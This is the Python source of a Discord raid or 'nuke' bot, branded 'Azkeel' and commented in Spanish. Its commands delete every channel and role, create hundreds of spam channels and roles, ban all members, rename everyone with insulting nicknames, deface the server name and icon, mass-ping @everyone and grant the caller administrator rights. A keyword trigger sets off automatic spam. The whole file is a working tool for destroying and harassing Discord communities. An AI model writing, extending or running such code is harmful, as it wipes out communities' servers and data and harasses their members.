import discord
from discord.ext import commands
from discord.ext.commands import bot
import colorama
from colorama import Fore
import random
import asyncio
 

token = "Bot_Token"



colors = {"main": Fore.RED,
          "white": Fore.WHITE,
          "red": Fore.RED}
msgs = {"info": f"{colors['white']}[{colors['main']}i{colors['white']}]",
        "+": f"{colors['white']}[{colors['main']}+{colors['white']}]",
        "error": f"{colors['white']}[{colors['red']}e{colors['white']}]",
        "input": f"{colors['red']}{colors['main']}>>{colors['red']}",
        "pressenter": f"{colors['red']}[{colors['main']}i{colors['red']}] Press ENTER to exit"}
        
intents = discord.Intents.all()
intents.members=True
bot = commands.Bot(command_prefix = ".", intents=intents)
bot.remove_command("help")

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Game('g'))
    border = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    text = f'''
┏{border}┓
┃
  ▄▄▄      ▒███████▒ ██ ▄█▀▓█████ ▓█████  ██▓    
 ▒████▄    ▒ ▒ ▒ ▄▀░ ██▄█▒ ▓█   ▀ ▓█   ▀ ▓██▒    
 ▒██  ▀█▄  ░ ▒ ▄▀▒░ ▓███▄░ ▒███   ▒███   ▒██░    
 ░██▄▄▄▄██   ▄▀▒   ░▓██ █▄ ▒▓█  ▄ ▒▓█  ▄ ▒██░    
 ▓█   ▓██▒▒███████▒▒██▒ █▄░▒████▒░▒████▒░██████▒
 ▒▒   ▓▒█░░▒▒ ▓░▒░▒     ▓▒░░ ▒░ ░░░ ▒░ ░░ ▒░▓  ░
  ▒   ▒▒ ░░░▒ ▒ ░ ▒░ ░▒ ▒░ ░ ░  ░ ░ ░  ░░ ░ ▒  ░
  ░   ▒   ░ ░ ░ ░ ░░ ░░ ░    ░      ░     ░ ░   
      ░  ░  ░ ░    ░  ░      ░  ░   ░  ░    ░  ░
          ░                                     

┃                                        ┃
┣{border}┫
┃ Gracias por usar mi código             ┃
┣{border}┫
┃                                        ┃
┃          > admin                       ┃
┃          > banall                      ┃
┃          > eroles                      ┃
┃          > roles                       ┃
┃          > bypass                      ┃
┃          > on                          ┃
┃          > nuke                        ┃
┣{border}┫
┃ servers: {len(bot.guilds):<4}  miembros: {len(bot.users):<4}          ┃
┗{border}┛
'''
    print(text)

@bot.event
async def on_guild_channel_create(channel, spam=(f"@everyone Azkeel On Top #PwnedByAzkeelServices")):
    embed = discord.Embed(title="Azkeel Never Dies", color=discord.Color.red())
    embed.set_image(url="https://cdn.discordapp.com/attachments/995483406857158696/1130288792985673729/e0b3e418ecd62ecb9e609a0ed17d2f52.gif")
    embed.add_field(name='', value="Azkeel ha tomado este servidor #AzkeelOnTop```")

    tasks = [channel.send(spam, embed=embed) for _ in range(2,17,5)]
    await asyncio.gather(*tasks)

@bot.slash_command(description="iniciara un raid", guild_ids=None)
async def on(ctx):
    nombre = "azkeel On Top"
    with open('image.png', 'rb') as f:
        icon = f.read()

    try:
        await ctx.guild.edit(name="azkeel is here", icon=icon)
        print(f"{msgs['+']} Nombre e ícono del servidor cambiados.")
    except discord.Forbidden:
        print(f"{msgs['error']} Permisos insuficientes para editar el servidor.")
        return
    except discord.HTTPException:
        print(f"{msgs['error']} No se pudo editar el servidor debido a un error en Discord.")
        return

    async def create_channels():
        create_tasks = []
        for i in range(500):
            create_tasks.append(ctx.guild.create_text_channel(nombre))
        await asyncio.gather(*create_tasks)
        print(f"{msgs['+']} Todos los canales creados.")

    async def delete_channels():
        try:
            for channel in ctx.guild.channels:
                await channel.delete()
            print(f"{msgs['+']} Todos los canales existentes eliminados.")
        except discord.Forbidden:
            print(f"{msgs['error']} Permisos insuficientes para eliminar canales.")
        except discord.HTTPException:
            print(f"{msgs['error']} No se pudieron eliminar los canales debido a un error en Discord.")

    await asyncio.gather( delete_channels(),create_channels())
    print("El raid ha sido completado con éxito.")


@bot.slash_command(description="creara el maximo de roles",guild_ids= None)
async def roles(ctx, amount: int = 307, *, name="#AzkeelIsHere"):
    for i in range(amount):
        try:
            await ctx.guild.create_role(name=name, color=discord.Color.darker_grey())
            print(f"{msgs['+']} rol creado")
        except:
            print(f"{msgs['error']} no se pudo crear el rol")               
       
@bot.slash_command(description="eliminara todos los roles del servidor",guild_ids= None)
async def eroles(ctx):
    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} rol eliminado: {r}")
        except:
            print(f"{msgs['error']} no se pudo eliminar el rol: {r}")

@bot.command(description="te dara un rol con administrador",guild_ids= None)
async def admin(ctx, *, rolename="G"):
    try:
        perms = discord.Permissions(administrator=True)
        role = await ctx.guild.create_role(name=rolename, permissions=perms)
        await ctx.message.author.add_roles(role)
        print(f"{msgs['+']} se le dio admin a {ctx.message.author}")
    except:
    	pass

@bot.slash_command(description="baneara a todos los usuarios del servidor",guild_ids= None)
async def banall(ctx):
    for m in ctx.guild.members:
            try:
                await m.ban()
                await ctx.respond(f"banned: {m}")
            except:
            	pass
            
@bot.slash_command(description="cambiara el nick de todos a #FuckedByAzkeel",guild_ids=None)
async def nickall(ctx, *, name="#FuckedByAzkeel"):
    for m in ctx.guild.members:
            try:
                await m.edit(nick=name)
                print(f"{msgs['+']} nick puesto a  {m}'s ")
            except:
            	pass

@bot.slash_command(description="te dara informacion sobre el bot",guild_ids=None)
async def info(ctx):
    embed = discord.Embed(title="stats",color = discord.Color.red())
    embed.add_field(name="servidores totales",value=f"**{len(bot.guilds)}**")
    embed.add_field(name="usuarios totales",value=f"**{len(bot.users)}**")
    embed.add_field(name="version",value="v 1.2.1")
    embed.add_field(name="comandos",value="9")
    embed.add_field(name="bot id",value="1001521081657602159")
    await ctx.send(embed=embed)

@bot.slash_command(description="Eliminará todos los canales y creará uno nuevo", guild_ids=None)
async def nuke(ctx):
    deletable_channels = [ch for ch in ctx.guild.channels]

    try:
        await asyncio.gather(*[ch.delete() for ch in deletable_channels])
        print(f"{msgs['+']} Deleted {len(deletable_channels)} channels.")
    except Exception as e:
        print(f"{msgs['error']} Error deleting channels: {e}")

    try:
        new_channel = await ctx.guild.create_text_channel("fucked")  # Puedes cambiar "new-channel" al nombre que desees
        print(f"{msgs['+']} Created new channel: {new_channel}")
    except Exception as e:
        print(f"{msgs['error']} Error creating a new channel: {e}")

@bot.slash_command(description="cambiara el nombre de los canales y hará spam ",guild_ids=None)

async def bypass(ctx, spam = "@everyone" ):

              for i in range(100):

                for ch in ctx.guild.channels:

                 try:

                     await ch.edit(name = "ByPass by Azkeel", topic = "pwned")

                     print("bypass en proceso...")

                     await ch.send(spam)

                 except:

                      pass


@bot.event
async def on_message(message):
    spam = "@everyone bypass by azkeel"
    if message.author.bot: 
        return

    if message.content == "bypass":
        async def process_channel(channel):
            try:
                await channel.edit(name="ByPass by Azkeel", topic="pwned")
                await channel.send(spam)
                print("bypass en proceso...")
            except:
                pass

        text_channels = [ch for ch in message.guild.channels if isinstance(ch, discord.TextChannel)]
        tasks = [process_channel(ch) for ch in text_channels for _ in range(17)]
        await asyncio.gather(*tasks)


bot.run(token)
